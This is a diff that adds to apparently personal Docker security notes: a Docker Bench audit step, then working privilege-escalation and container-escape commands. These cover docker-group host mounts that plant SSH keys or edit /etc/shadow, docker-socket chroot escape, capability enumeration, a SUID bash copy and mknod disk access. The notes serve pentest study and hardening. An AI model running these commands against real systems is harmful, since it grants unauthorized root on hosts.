@@ -140,8 +140,94 @@ On the client:
 
 # Auditing Docker
 
+## Docker Bench for Security
+- Based on CIS Docker Benchmark
+- [Repository](https://github.com/docker/docker-bench-security)
+```
+./docker-bench-security
+```
+
 # Docker Attacks
+
+## 1. Docker group privilege escalation on host
+- If low privilege user is part of the `docker` group
+- Start a new docker container
+- Mount the root directory of the host into the container
+  ```
+  docker run -it -v /:/host/ alpine:latest bash
+  cd /host
+  ```
+- Now exploit
+  - Put your own ssh key into /host/root/.ssh
+  - Modify /host/etc/shadow to create a new root user with a known password
+
+## 2. Container escape - From privileged container to host
+
+### Mounted docker socket escape
+- If a docker socket is mounted on a running container, we can communicate with the docker daemon from within the container
+```
+# Check if a docker socket is mounted. It is usually in /run/docker.sock
+find / -name docker.sock 2>/dev/null
+
+# Run an image within the existing image and mount the root directory of the host to /host of the container
+docker run -it -v /:/host/ alpine:latest bash
+cd host
+chroot ./ bash
+```
+
+### Linux capabilities escape
+Find abuse vectors for capabilities at [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_admin)
+```
+# Enumerate for capabilities
+capsh --print
+
+# Look for any of these
+CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE, CAP_SYS_RAWIO, CAP_SYSLOG, CAP_NET_RAW, CAP_NET_ADMIN
+
+# Find abuse methods on the hacktricks link above
+```
+
+### Container root with mount -> host root 🔥
+- In the container - There is a host mount /host_in_cont. You are root
+- In the host - You have read access to the mounted directory /host. You are lowuser
+```
+# On host
+cp /bin/bash /host
+
+# On container
+chown root:root /host_in_cont/bash
+chmod 4777 bash
+
+# On host
+bash -p
+```
+
+### Container root without mount -> host root 🔥
+- In the container - You are root
+  - You will have the capability MKNOD by default.
+  - With this capability we can create block device files.
+    - Device files are used to access underlying hardware and kernel module.
+    - `/dev/sda` block device file allows to read raw data on the disk
+  - ⭐ If a block file is created within a container - it can be accessed by a host user with the same username of the in-container creator, at `/proc/PID/root/`
+- In the host - You are lowuser
+```
+# On container
+cd /
+mknod sda b 8 0
+chmod 777 sda
+echo "lowuser:x:1000:1000:lowuser,,,:/home/lowuser:/bin/bash" >> /etc/passwd
+su lowuser
+
+# On host - get the PID of the lowuser shell in the container
+ps -aux | grep /bin/sh
+ls /proc/PID/root/sda
+```
 
 **Resources:**
 1. [Securing The Docker Daemon by HackerSploit](https://www.youtube.com/watch?v=70QOBVwLyC0&list=PLBf0hzazHTGNv0-GVWZoveC49pIDHEHbn&index=7)
 2. [How To Secure & Harden Docker Containers by HackerSploit](https://www.youtube.com/watch?v=CQLtT_qeB40&list=PLBf0hzazHTGNv0-GVWZoveC49pIDHEHbn&index=6)
+3. [Auditing Docker Security by HackerSploit](https://www.youtube.com/watch?v=mQkVB6KMHCg&list=PLBf0hzazHTGNv0-GVWZoveC49pIDHEHbn&index=2)
+4. [Linux Privilege Escalation - Docker Group](https://www.youtube.com/watch?v=pRBj2dm4CDU&list=PLDrNMcTNhhYrBNZ_FdtMq-gLFQeUZFzWV&index=2)
+5. [Escaping Docker Containers - Mounted Docker Socket](https://www.youtube.com/watch?v=EEFRuUUlDck)
+6. [Docker Pentesting by HackTricks](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising)
+7. [Docker Breakout / Privilege Escalation by HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
